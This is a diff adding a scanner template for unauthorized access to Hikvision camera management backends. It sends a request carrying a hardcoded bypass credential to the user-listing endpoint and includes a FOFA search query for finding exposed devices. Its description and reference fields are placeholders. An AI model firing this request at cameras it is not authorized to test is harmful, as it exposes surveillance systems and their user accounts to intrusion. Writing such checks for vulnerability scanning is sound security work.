@@ -1,0 +1,33 @@
+id: HIKVISION-Unauthorized
+
+info:
+  name: 海康威视摄像头管理后台未授权
+  author: candada
+  severity: high
+  description: description
+  reference:
+    - https://
+  metadata:
+    fofa-query: app="HIKVISION-视频监控"
+  tags: tags
+
+http:
+  - raw:
+      - |+
+        GET /Security/users?auth=YWRtaW46MTEK HTTP/1.1
+        Host: {{Hostname}}
+        User-agent: Mozilla/5.0 (X11; U; Linux i686; zh-CN; rv:1.9.1.6) Gecko/20091216 Fedora/3.5.6-1.fc11 Firefox/3.5.6 GTB6
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - Administrator
+      - type: status
+        status:
+          - 200
